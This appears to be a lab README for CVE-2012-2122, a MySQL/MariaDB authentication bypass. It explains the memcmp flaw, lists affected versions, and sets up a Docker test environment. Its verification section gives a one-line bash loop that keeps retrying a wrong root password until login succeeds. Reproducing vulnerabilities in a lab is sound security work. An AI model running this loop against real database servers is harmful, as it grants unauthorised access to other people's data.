# Mysql Identity Authentication Bypass Vulnerability (CVE-2012-2122)

When connecting to MariaDB/MySQL, the entered password will be compared with the expected correct password. Due to incorrect processing, even if memcmp() returns a non-zero value, MySQL will think that the two passwords are the same. In other words, as long as you know the user name and keep trying, you can log in to the SQL database directly.

Affected version:

- MariaDB versions from 5.1.62, 5.2.12, 5.3.6, 5.5.23 are not.
- MySQL versions from 5.1.63, 5.5.24, 5.6.6 are not.

Reference link:

- http://www.freebuf.com/vuls/3815.html
- https://blog.rapid7.com/2012/06/11/cve-2012-2122-a-tragically-comedic-security-flaw-in-mysql/

## Environment setup

After testing, although this environment runs inside the container, whether the vulnerability can be reproduced still has a certain relationship with the host. The host is best to choose Ubuntu or Mac system, but I donâ€™t know whether it will be successful. Welcome to submit more test results in Issue.

Execute the following command to start the test environment:

```
docker-compose up -d
```

After the environment is started, a Mysql service (version: 5.5.23) will be started, listening to port 3306, and you can log in directly through a normal Mysql client. The correct root password is 123456.

## Vulnerability verification

Without knowing the correct password for our environment, run the following command under bash, and log in successfully after a certain number of attempts:

```bash
for i in `seq 1 1000`; do mysql -uroot -pwrong -h your-ip -P3306; done
```

![](1.png)

For more testing and utilization methods, see the reference link.